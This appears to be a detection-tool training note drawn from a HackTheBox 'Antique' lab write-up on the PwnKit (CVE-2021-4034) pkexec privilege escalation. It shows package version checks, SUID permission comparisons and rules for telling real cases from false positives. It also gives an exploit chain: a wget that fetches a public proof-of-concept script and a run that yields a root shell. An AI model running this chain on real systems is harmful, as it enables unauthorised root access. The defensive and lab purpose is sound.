# HTB Antique: CVE-2021-4034 (PwnKit): Confirmed Exploitable Variant

**Platform:** HackTheBox
**Machine:** Antique
**Source:** 0xdf writeup (referenced alongside RouterSpace comparison)
**Year:** 2022
**Category:** PwnKit (polkit pkexec local privesc): this is the CONFIRMED
exploitable case, contrasting with the RouterSpace false-positive case in the
companion file `htb_routerspace_baron_samedit.md`.

## Why include both Antique (works) and RouterSpace (false positive)
Together these two samples teach the detection module the CRITICAL
distinction: PwnKit is only exploitable when `pkexec` is SetUID root AND the
policykit-1 package version is in the vulnerable range. LinPEAS's exploit
suggester flags BOTH boxes as "vulnerable" by kernel/distro heuristics, but
only one is actually exploitable. ReadPEAS needs to check the SUID bit, not
just trust the suggester tag.

## Manual Verification Method (as shown in writeup, quoting Datadog's PwnKit post)
```
lp@antique:/dev/shm$ dpkg -s policykit-1
Package: policykit-1
Status: install ok installed
Priority: optional
Section: admin
Installed-Size: 560
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Architecture: amd64
Multi-Arch: foreign
Version: 0.105-26ubuntu1.1
Depends: dbus, libpam-systemd, libc6 (>= 2.7), libexpat1 (>= 2.0.1), libglib2.0-0 (>= 2.37.3), libpam0g (>= 0.99.7.1), libpolkit-agent-1-0 (= 0.105-26ubuntu1.1), libpolkit-gobject-1-0 (= 0.105-26ubuntu1.1), libsystemd0 (>= 213)
Conffiles:
 /etc/pam.d/polkit-1 7c794427f656539b0d4659b030904fe0
 /etc/polkit-1/localauthority.conf.d/50-localauthority.conf 2adb9d174807b0a3521fabf03792fbc8
 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf c4dbd2117c52f367f1e8b8c229686b10
Description: framework for managing administrative policies and privileges
 PolicyKit is an application-level toolkit for defining and handling the policy
 that allows unprivileged processes to speak to privileged processes.
```
Key line:
```
Version: 0.105-26ubuntu1.1
```
This is confirmed as the last vulnerable version on Ubuntu 20.04 focal
(per Datadog's PwnKit remediation post referenced in the writeup).

## What LinPEAS would show (companion confirmation, per the exploit suggester
format seen on RouterSpace, section name identical)
```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

## The critical additional check LinPEAS/SUID section provides
For PwnKit to actually work, `pkexec` must be SUID root. Compare:
- **Antique (vulnerable)**: pkexec IS SetUID root (implicit: exploit succeeds)
- **RouterSpace (NOT vulnerable, false positive)**: explicitly checked and
  shown NOT SetUID:
```
paul@routerspace:/dev/shm$ which pkexec
/usr/bin/pkexec
paul@routerspace:/dev/shm$ ls -l /usr/bin/pkexec
-rwxr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
```
Note the permission string `-rwxr-xr-x`: NO `s` bit in the owner-execute
position. A truly vulnerable pkexec would show `-rwsr-xr-x`.

## Exploit Chain (Antique: confirmed working)
```bash
# Download POC (attacker chooses one from exploit-suggester or known repos)
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```
On target:
```
lp@antique:/dev/shm$ python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=7(lp) groups=7(lp),19(lpadmin)
```

## Detection Pattern for ReadPEAS
1. Grep exploit-suggester output for `[CVE-2021-4034] PwnKit`.
2. **MANDATORY secondary check** before flagging CRITICAL: look at the SUID
   section for `/usr/bin/pkexec` and verify the permission string starts with
   `-rwsr` (SUID bit set), not `-rwxr` (no SUID bit).
   - If SUID bit present → CRITICAL, provide exploit command.
   - If SUID bit absent → do NOT flag as exploitable; optionally note as
     INFO "PwnKit CVE tag present but pkexec is not SetUID: not exploitable
     via this vector."
3. Alternative confirmation method (if SUID section unavailable/unclear):
   grep readable dpkg/apt package info for `policykit-1` version string and
   compare against known-vulnerable range (< 0.120 roughly, exact per-distro
   cutoffs vary: the "Version:" line format is `dpkg -s` style output,
   distinct from the box-drawing LinPEAS software-version sections).
